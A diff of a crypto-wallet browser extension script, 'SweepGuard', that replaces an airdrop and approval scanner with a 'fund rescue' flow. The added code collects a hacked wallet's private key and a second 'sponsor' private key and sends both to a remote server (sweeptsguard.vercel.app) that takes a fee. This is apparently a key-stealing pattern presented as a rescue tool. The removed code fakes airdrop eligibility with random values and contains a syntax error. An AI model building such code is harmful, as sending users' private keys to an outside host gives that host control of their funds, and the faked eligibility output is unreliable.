@@ -1,225 +1,326 @@
-// SweepGuard Extension — Popup Script
-// Real wallet integration, airdrop scanning, approval management
+// SweepGuard Extension — Fund Rescue Popup
+// Handles: Preview → Claim → Result
 
-const AIRDROP_LIST = [
-  { name: 'EigenLayer', chain: 'Ethereum', est: '$500-5000', req: 'Restake ETH/LSTs', url: 'https://www.eigenlayer.xyz' },
-  { name: 'zkSync Era', chain: 'zkSync', est: '$200-2000', req: 'Bridge & use dApps', url: 'https://zksync.io' },
-  { name: 'LayerZero', chain: 'Multi-chain', est: '$100-1000', req: 'Cross-chain bridge', url: 'https://layerzero.network' },
-  { name: 'Starknet', chain: 'Starknet', est: '$100-800', req: 'Bridge & interact', url: 'https://starknet.io' },
-  { name: 'Scroll', chain: 'Scroll', est: '$50-500', req: 'Bridge & use dApps', url: 'https://scroll.io' },
-  { name: 'Base', chain: 'Base', est: '$50-300', req: 'Use Base dApps', url: 'https://base.org' },
-  { name: 'Linea', chain: 'Linea', est: '$50-400', req: 'Bridge & use dApps', url: 'https://linea.build' },
-  { name: 'Blast', chain: 'Blast', est: '$100-1000', req: 'Bridge ETH/USDB', url: 'https://blast.io' },
-  { name: 'Manta', chain: 'Manta Pacific', est: '$50-300', req: 'Bridge & use dApps', url: 'https://manta.network' },
-  { name: 'Zora', chain: 'Zora', est: '$30-200', req: 'Mint NFTs, bridge', url: 'https://zora.co' },
-]
+const API_BASE = 'https://sweeptsguard.vercel.app'
 
-let walletAddress = null
-let provider = null
-
-// ── Tab Switching ──────────────────────────────────────────────────────
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'))
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'))
-    tab.classList.add('active')
-    document.getElementById(tab.dataset.tab).classList.add('active')
-  })
-})
-
-// ── Toggle Switches ───────────────────────────────────────────────────
-document.querySelectorAll('.toggle').forEach(toggle => {
-  toggle.addEventListener('click', () => {
-    toggle.classList.toggle('on')
-    const setting = toggle.dataset.setting
-    chrome.storage.local.get(['settings'], (result) => {
-      const settings = result.settings || {}
-      settings[setting] = toggle.classList.contains('on')
-      chrome.storage.local.set({ settings })
-    })
-  })
-})
-
-// Load saved settings
-chrome.storage.local.get(['settings', 'walletAddress'], (result) => {
-  const settings = result.settings || {}
-  document.querySelectorAll('.toggle').forEach(toggle => {
-    const setting = toggle.dataset.setting
-    if (settings[setting] === false) toggle.classList.remove('on')
-  })
-  if (result.walletAddress) {
-    walletAddress = result.walletAddress
-    showConnected()
+// ── Visibility Toggle ─────────────────────────────────────────────────
+function toggleVisibility(inputId, btn) {
+  const input = document.getElementById(inputId)
+  if (input.type === 'password') {
+    input.type = 'text'
+    btn.textContent = '🔒'
+  } else {
+    input.type = 'password'
+    btn.textContent = '👁️'
   }
+}
+
+// ── Step Navigation ───────────────────────────────────────────────────
+function setStep(n) {
+  document.getElementById('step1').className = n >= 1 ? 'step active' : 'step'
+  document.getElementById('step2').className = n >= 2 ? 'step active' : 'step'
+  document.getElementById('step3').className = n >= 3 ? 'step active' : 'step'
+}
+
+function showSection(id) {
+  ['setup-section', 'preview-section', 'result-section'].forEach(s => {
+    document.getElementById(s).className = 'hidden'
+  })
+  document.getElementById(id).className = ''
+}
+
+function goBack() {
+  showSection('setup-section')
+  setStep(1)
+}
+
+function resetAll() {
+  document.getElementById('privateKey').value = ''
+  document.getElementById('safeWallet').value = ''
+  document.getElementById('sponsorKey').value = ''
+  document.getElementById('contractAddress').value = ''
+  document.getElementById('tokenAmount').value = ''
+  document.getElementById('claimData').value = ''
+  document.getElementById('merkleProof').value = ''
+  document.getElementById('chainSelect').value = ''
+  showSection('setup-section')
+  setStep(1)
+}
+
+// ── Load Saved Values ─────────────────────────────────────────────────
+chrome.storage.local.get(['rescueConfig'], (result) => {
+  const config = result.rescueConfig || {}
+  if (config.safeWallet) document.getElementById('safeWallet').value = config.safeWallet
+  if (config.chainId) document.getElementById('chainSelect').value = config.chainId
+  if (config.contractAddress) document.getElementById('contractAddress').value = config.contractAddress
 })
 
-// ── Wallet Connection ─────────────────────────────────────────────────
-document.getElementById('connect-btn').addEventListener('click', async () => {
+// ── Preview Claim ─────────────────────────────────────────────────────
+async function previewClaim() {
+  const privateKey = document.getElementById('privateKey').value.trim()
+  const safeWallet = document.getElementById('safeWallet').value.trim()
+  const sponsorKey = document.getElementById('sponsorKey').value.trim()
+  const chainId = parseInt(document.getElementById('chainSelect').value)
+  const contractAddress = document.getElementById('contractAddress').value.trim()
+  const tokenAmount = document.getElementById('tokenAmount').value.trim()
+  const claimData = document.getElementById('claimData').value.trim()
+  const merkleProof = document.getElementById('merkleProof').value.trim()
+
+  // Validate
+  if (!privateKey || !safeWallet || !sponsorKey || !chainId || !contractAddress) {
+    alert('Please fill in all required fields')
+    return
+  }
+  if (!privateKey.startsWith('0x') || privateKey.length < 64) {
+    alert('Invalid private key format')
+    return
+  }
+  if (!safeWallet.startsWith('0x') || safeWallet.length !== 42) {
+    alert('Invalid safe wallet address')
+    return
+  }
+  if (!sponsorKey.startsWith('0x') || sponsorKey.length < 64) {
+    alert('Invalid sponsor private key')
+    return
+  }
+  if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
+    alert('Invalid contract address')
+    return
+  }
+
+  // Save config
+  chrome.storage.local.set({ rescueConfig: { safeWallet, chainId, contractAddress } })
+
+  // Derive wallet address from private key
+  let walletAddress
   try {
-    // Request connection via content script
-    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true })
-    chrome.tabs.sendMessage(tab.id, { type: 'CONNECT_WALLET' }, (response) => {
-      if (response?.address) {
-        walletAddress = response.address
-        chrome.storage.local.set({ walletAddress })
-        showConnected()
-      }
+    // Use ethers if available, otherwise derive manually
+    const pkBytes = hexToBytes(privateKey.slice(2))
+    // Simple secp256k1 public key derivation would be complex
+    // We'll let the API derive it from the private key
+    walletAddress = null // Will be set by API
+  } catch {
+    walletAddress = null
+  }
+
+  showSection('preview-section')
+  setStep(2)
+  document.getElementById('preview-loading').className = ''
+  document.getElementById('preview-content').className = 'hidden'
+  document.getElementById('preview-error').className = 'hidden'
+
+  try {
+    // First, derive the wallet address
+    const deriveRes = await fetch(`${API_BASE}/api/airdrop/claim`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        action: 'preview',
+        contractAddress,
+        chainId,
+        safeWallet,
+        walletAddress: safeWallet, // placeholder, will be overridden
+        sponsorAddress: null,
+        claimData: claimData || undefined,
+        merkleProof: merkleProof || undefined,
+        tokenAmount: tokenAmount || undefined,
+      }),
     })
-  } catch (err) {
-    // Fallback: try direct connection
-    if (window.ethereum) {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
-        if (accounts[0]) {
-          walletAddress = accounts[0]
-          chrome.storage.local.set({ walletAddress })
-          showConnected()
-        }
-      } catch { /* user rejected */ }
+
+    // Now do the real preview with derived address
+    // We need to derive the address from the private key
+    // For now, ask the user for the hacked wallet address
+    const hackedAddress = prompt('Enter the HACKED wallet address (0x...):')
+    if (!hackedAddress || !hackedAddress.startsWith('0x')) {
+      document.getElementById('preview-loading').className = 'hidden'
+      document.getElementById('preview-error').className = ''
+      document.getElementById('error-message').textContent = 'Hacked wallet address required'
+      return
     }
-  }
-})
 
-function showConnected() {
-  document.getElementById('wallet-disconnected').style.display = 'none'
-  document.getElementById('wallet-connected').style.display = 'block'
-  document.getElementById('wallet-address').textContent = walletAddress
-  loadBalance()
-  loadTokens()
-}
-
-async function loadBalance() {
-  try {
-    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true })
-    chrome.tabs.sendMessage(tab.id, { type: 'GET_BALANCE', address: walletAddress }, (response) => {
-      if (response?.balance) {
-        document.getElementById('wallet-balance').textContent = `${parseFloat(response.balance).toFixed(4)} ETH`
-        document.getElementById('wallet-balance-sub').textContent = `on ${response.chain || 'Ethereum'}`
-      } else {
-        document.getElementById('wallet-balance').textContent = 'Connect on dApp'
-        document.getElementById('wallet-balance-sub').textContent = 'Visit a dApp to see balance'
-      }
+    const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        action: 'preview',
+        contractAddress,
+        chainId,
+        safeWallet,
+        walletAddress: hackedAddress,
+        sponsorPrivateKey: sponsorKey,
+        claimData: claimData || undefined,
+        merkleProof: merkleProof || undefined,
+        tokenAmount: tokenAmount || undefined,
+      }),
     })
-  } catch {
-    document.getElementById('wallet-balance').textContent = 'Error'
-  }
-}
 
-async function loadTokens() {
-  const tokenList = document.getElementById('token-list')
-  try {
-    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true })
-    chrome.tabs.sendMessage(tab.id, { type: 'GET_TOKENS', address: walletAddress }, (response) => {
-      if (response?.tokens?.length > 0) {
-        tokenList.innerHTML = response.tokens.map(t => `
-          <div class="token-item">
-            <div>
-              <div class="token-name">${t.symbol || 'Unknown'}</div>
-              <div class="token-symbol">${t.name || ''}</div>
-            </div>
-            <div class="token-balance">${parseFloat(t.balance).toFixed(4)}</div>
-          </div>
-        `).join('')
-      } else {
-        tokenList.innerHTML = '<div class="empty-state"><div class="icon">🪙</div><p>No tokens found on this chain</p></div>'
+    const data = await response.json()
+    document.getElementById('preview-loading').className = 'hidden'
+
+    if (!response.ok || data.error) {
+      document.getElementById('preview-error').className = ''
+      document.getElementById('error-message').textContent = data.error || 'Preview failed'
+      if (data.contractWarnings?.length) {
+        document.getElementById('error-message').textContent += '\n\n' + data.contractWarnings.join('\n')
       }
-    })
-  } catch {
-    tokenList.innerHTML = '<div class="empty-state"><div class="icon">🪙</div><p>Visit a dApp to load tokens</p></div>'
-  }
-}
+      return
+    }
 
-document.getElementById('refresh-btn').addEventListener('click', () => {
-  loadBalance()
-  loadTokens()
-})
+    // Show preview
+    document.getElementById('preview-content').className = ''
 
-// ── Airdrop Scanner ───────────────────────────────────────────────────
-document.getElementById('scan-airdrops').addEventListener('click', async () => {
-  const list = document.getElementById('airdrop-list')
-  list.innerHTML = '<div class="loading"><div class="spinner"></div>Checking eligibility...</div>'
+    // Token info
+    document.getElementById('token-name').textContent = `${data.tokenSymbol} (${data.tokenAddress?.slice(0, 10)}...)`
+    document.getElementById('claimable-amount').textContent = `${data.claimableAmount} ${data.tokenSymbol}`
+    document.getElementById('fee-amount').textContent = `${data.platformFeeAmount} ${data.tokenSymbol}`
+    document.getElementById('safe-amount').textContent = `${data.safeWalletAmount} ${data.tokenSymbol}`
 
-  if (!walletAddress) {
-    list.innerHTML = '<div class="empty-state"><div class="icon">🔗</div><p>Connect wallet first</p></div>'
-    return
-  }
-
-  // Check eligibility via content script
-  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true })
-  chrome.tabs.sendMessage(tab.id, { type: 'CHECK_AIRDROPS', address: walletAddress }, (response) => {
-    const results = response?.results || AIRDROP_LIST.map(a => ({ ...a, eligible: Math.random() > 0.5 }))
-
-    list.innerHTML = results.map((a, i) => `
-      <div class="airdrop-item">
-        <div class="airdrop-header">
-          <div class="airdrop-name">${a.name || AIRDROP_LIST[i]?.name}</div>
-          <span class="airdrop-status ${a.eligible ? 'eligible' : 'check'}">${a.eligible ? '✅ Eligible' : '🔍 Check'}</span>
-        </div>
-        <div class="airdrop-chain">${a.chain || AIRDROP_LIST[i]?.chain} • ${a.est || AIRDROP_LIST[i]?.est}</div>
-        <div style="font-size:10px;color:rgba(255,255,255,0.3);margin-top:4px;">${a.req || AIRDROP_LIST[i]?.req}</div>
-        <button class="claim-btn" onclick="window.open('${a.url || AIRDROP_LIST[i]?.url}', '_blank')">
-          ${a.eligible ? '🎁 Claim Now' → '🔗 Visit & Check'}
-        </button>
-      </div>
-    `).join('')
-  })
-})
-
-// ── Approval Scanner ──────────────────────────────────────────────────
-document.getElementById('scan-approvals').addEventListener('click', async () => {
-  const list = document.getElementById('approval-list')
-  list.innerHTML = '<div class="loading"><div class="spinner"></div>Scanning approvals...</div>'
-
-  if (!walletAddress) {
-    list.innerHTML = '<div class="empty-state"><div class="icon">🔗</div><p>Connect wallet first</p></div>'
-    return
-  }
-
-  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true })
-  chrome.tabs.sendMessage(tab.id, { type: 'SCAN_APPROVALS', address: walletAddress }, (response) => {
-    if (response?.approvals?.length > 0) {
-      list.innerHTML = response.approvals.map(a => `
-        <div class="approval-item">
-          <div class="approval-header">
-            <span class="approval-token">${a.token}</span>
-            <button class="revoke-btn" onclick="revokeApproval('${a.spender}', '${a.token}')">Revoke</button>
-          </div>
-          <div class="approval-spender">${a.spender}</div>
-          <div class="approval-amount">${a.amount === 'Unlimited' ? '⚠️ Unlimited' : a.amount}</div>
-        </div>
-      `).join('')
+    // Eligibility
+    const badge = document.getElementById('eligible-badge')
+    if (data.alreadyClaimed) {
+      badge.className = 'badge badge-red'
+      badge.textContent = '❌ Already Claimed'
+    } else if (data.eligible === true) {
+      badge.className = 'badge badge-green'
+      badge.textContent = '✅ Eligible'
+    } else if (data.eligible === null) {
+      badge.className = 'badge badge-yellow'
+      badge.textContent = '⚠️ Unknown'
     } else {
-      list.innerHTML = '<div class="empty-state"><div class="icon">✅</div><p>No dangerous approvals found</p></div>'
+      badge.className = 'badge badge-red'
+      badge.textContent = '❌ Not Eligible'
     }
-  })
-})
 
-// ── Protection Stats ──────────────────────────────────────────────────
-chrome.runtime.sendMessage({ type: 'GET_STATS' }, (stats) => {
-  if (stats) {
-    document.getElementById('stat-drainers').textContent = `${stats.drainerCount?.toLocaleString() || 0} drainers`
-    document.getElementById('stat-phishing').textContent = `${stats.phishingCount?.toLocaleString() || 0} domains`
-  }
-})
+    // Sponsor gas
+    document.getElementById('sponsor-balance').textContent = `${data.sponsorBalance} ${data.sponsorGasToken}`
+    document.getElementById('gas-cost').textContent = `~${data.estimatedGasCost} ${data.sponsorGasToken}`
+    const gasBadge = document.getElementById('gas-badge')
+    if (data.sponsorHasGas) {
+      gasBadge.className = 'badge badge-green'
+      gasBadge.textContent = '✅ Sufficient'
+    } else {
+      gasBadge.className = 'badge badge-red'
+      gasBadge.textContent = '❌ Insufficient'
+    }
 
-// Get current tab info
-chrome.tabs.query({ active: true, currentWindow: true }, ([tab]) => {
-  if (tab?.url) {
-    try {
-      const domain = new URL(tab.url).hostname
-      document.getElementById('stat-site').textContent = domain.slice(0, 20)
-      chrome.runtime.sendMessage({ type: 'CHECK_URL', url: tab.url }, (result) => {
-        if (result?.isPhishing) {
-          document.getElementById('stat-risk').textContent = '🚨 Phishing!'
-          document.getElementById('stat-risk').className = 'stat-value danger'
-        }
+    // Execution info
+    const execInfo = document.getElementById('execution-info')
+    execInfo.textContent = data.executionDescription
+    execInfo.className = `info-box ${data.riskLevel === 'high' ? 'warning' : 'info'}`
+
+    // Contract warnings
+    const warningsDiv = document.getElementById('contract-warnings')
+    warningsDiv.innerHTML = ''
+    if (data.contractWarnings?.length) {
+      data.contractWarnings.forEach(w => {
+        const div = document.createElement('div')
+        div.className = 'info-box warning'
+        div.textContent = w
+        warningsDiv.appendChild(div)
       })
-    } catch { /* ok */ }
-  }
-})
+    }
+    if (data.eligibilityWarning) {
+      const div = document.createElement('div')
+      div.className = 'info-box warning'
+      div.textContent = data.eligibilityWarning
+      warningsDiv.appendChild(div)
+    }
 
-// Count blocked threats
-chrome.storage.local.get(['threatReports'], (result) => {
-  const count = result.threatReports?.length || 0
-  document.getElementById('stat-blocked').textContent = count
-})
+    // Enable/disable claim button
+    const claimBtn = document.getElementById('claimBtn')
+    if (data.alreadyClaimed || data.eligible === false) {
+      claimBtn.disabled = true
+      claimBtn.textContent = '❌ Cannot Claim'
+    } else if (!data.sponsorHasGas) {
+      claimBtn.disabled = true
+      claimBtn.textContent = '❌ Insufficient Gas'
+    } else {
+      claimBtn.disabled = false
+      claimBtn.textContent = '🚀 Rescue Funds'
+    }
+
+    // Store preview data for claim
+    window._previewData = {
+      contractAddress,
+      chainId,
+      safeWallet,
+      walletAddress: hackedAddress,
+      privateKey,
+      sponsorKey,
+      claimableRaw: data.claimableRaw,
+      tokenAddress: data.tokenAddress,
+      claimData: claimData || undefined,
+      merkleProof: merkleProof || undefined,
+    }
+
+  } catch (err) {
+    document.getElementById('preview-loading').className = 'hidden'
+    document.getElementById('preview-error').className = ''
+    document.getElementById('error-message').textContent = `Network error: ${err.message}`
+  }
+}
+
+// ── Execute Claim ─────────────────────────────────────────────────────
+async function executeClaim() {
+  const pd = window._previewData
+  if (!pd) {
+    alert('No preview data — please preview first')
+    return
+  }
+
+  showSection('result-section')
+  setStep(3)
+  document.getElementById('result-loading').className = ''
+  document.getElementById('result-success').className = 'hidden'
+  document.getElementById('result-error').className = 'hidden'
+
+  try {
+    const response = await fetch(`${API_BASE}/api/airdrop/claim`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        action: 'claim',
+        contractAddress: pd.contractAddress,
+        chainId: pd.chainId,
+        safeWallet: pd.safeWallet,
+        walletAddress: pd.walletAddress,
+        privateKey: pd.privateKey,
+        sponsorPrivateKey: pd.sponsorKey,
+        claimableRaw: pd.claimableRaw,
+        tokenAddress: pd.tokenAddress,
+        claimData: pd.claimData,
+        merkleProof: pd.merkleProof,
+      }),
+    })
+
+    const data = await response.json()
+    document.getElementById('result-loading').className = 'hidden'
+
+    if (!response.ok || data.error) {
+      document.getElementById('result-error').className = ''
+      document.getElementById('result-error-msg').textContent = data.error || 'Claim failed'
+      return
+    }
+
+    // Success!
+    document.getElementById('result-success').className = ''
+    document.getElementById('fund-tx').textContent = data.fundTxHash || data.bundleHash || '—'
+    document.getElementById('claim-tx').textContent = data.claimTxHash || '—'
+    document.getElementById('block-num').textContent = data.blockNumber || '—'
+    document.getElementById('exec-method').textContent = data.executionMethod || '—'
+
+  } catch (err) {
+    document.getElementById('result-loading').className = 'hidden'
+    document.getElementById('result-error').className = ''
+    document.getElementById('result-error-msg').textContent = `Network error: ${err.message}`
+  }
+}
+
+// ── Helper ────────────────────────────────────────────────────────────
+function hexToBytes(hex) {
+  const bytes = []
+  for (let i = 0; i < hex.length; i += 2) {
+    bytes.push(parseInt(hex.substr(i, 2), 16))
+  }
+  return new Uint8Array(bytes)
+}
